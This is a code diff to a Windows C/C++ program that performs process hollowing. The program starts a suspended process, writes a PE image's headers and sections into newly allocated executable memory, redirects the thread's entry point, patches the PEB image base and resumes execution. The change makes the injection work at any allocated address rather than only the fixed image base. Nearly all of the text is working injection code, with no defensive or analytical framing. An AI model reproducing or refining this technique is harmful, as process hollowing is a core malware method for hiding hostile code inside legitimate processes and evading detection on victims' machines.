@@ -26,7 +26,6 @@ int main()
 	}
 
 
-
 	PROCESS_BASIC_INFORMATION pbi;
 
 	/* Retrieves ProcessBasicInformaton info from the created process */
@@ -54,14 +53,14 @@ int main()
 	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);
 
 	/* Allocate virtual memory for the process which is to be injected */
-	VirtualAllocEx(pi.hProcess, (LPVOID)pNTHeaderResource->OptionalHeader.ImageBase, pNTHeaderResource->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	LPVOID baseAddress = VirtualAllocEx(pi.hProcess, NULL, pNTHeaderResource->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	PBYTE pHeader = new BYTE[pNTHeaderResource->OptionalHeader.SizeOfHeaders];
 
 	memcpy(pHeader, pDosHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders);
 
 	/* Copy the headers of the process that is to be injected into the created process */
-	if (!WriteProcessMemory(pi.hProcess, (LPVOID)pNTHeaderResource->OptionalHeader.ImageBase, pHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders, NULL))
+	if (!WriteProcessMemory(pi.hProcess, baseAddress, pHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders, NULL))
 	{
 		printf("Failed: Unable to write headers: %i", GetLastError());
 		return -1;
@@ -78,7 +77,7 @@ int main()
 
 		memcpy(pSectionData, (PVOID)((DWORD)pDosHeader + (DWORD)pSectionHeader->PointerToRawData), (DWORD)pSectionHeader->SizeOfRawData);
 
-		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pNTHeaderResource->OptionalHeader.ImageBase + (DWORD)pSectionHeader->VirtualAddress), pSectionData, (DWORD)pSectionHeader->SizeOfRawData, NULL))
+		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)baseAddress + (DWORD)pSectionHeader->VirtualAddress), pSectionData, (DWORD)pSectionHeader->SizeOfRawData, NULL))
 		{
 			printf("Failed copying data from %s: %i", pSectionHeader->Name, GetLastError());
 			return -1;
@@ -92,22 +91,21 @@ int main()
 	GetThreadContext(pi.hThread, lpContext);
 
 	/* Set the Orginal Entry Point (OEP) value */
-	lpContext->Eax = (DWORD)pNTHeaderResource->OptionalHeader.ImageBase + (DWORD)pNTHeaderResource->OptionalHeader.AddressOfEntryPoint;
+	lpContext->Eax = (DWORD)baseAddress + (DWORD)pNTHeaderResource->OptionalHeader.AddressOfEntryPoint;
 
 	/* Set the suspended exe context with the updated eax value which points to the injected code */
 	SetThreadContext(pi.hThread, lpContext);
 
 	/* Overwrite the PEB base address with the image base address of the injected exe */
-	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pbi.PebBaseAddress + pebImageBaseAddrOffset), &pNTHeaderResource->OptionalHeader.ImageBase, baseAddrLength, NULL);
+	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pbi.PebBaseAddress + pebImageBaseAddrOffset), &baseAddress, baseAddrLength, NULL);
 
 	/* Resume the created processes main thread with the updated OEP */
 	ResumeThread(pi.hThread);
 
 
 	printf("\nCreated Process id: %i\n", pi.dwProcessId);
-	printf("Created process PebBaseAddress: 0x%x\n", pbi.PebBaseAddress);
 	printf("Created process Image Base Address 0x%x\n", pPeb->ImageBaseAddress);
-	printf("Injected process Image Base Address 0x%x\n", pNTHeaderResource->OptionalHeader.ImageBase);
+	printf("Injected process Image Base Address 0x%x\n", baseAddress);
 
 	return 0;
 }
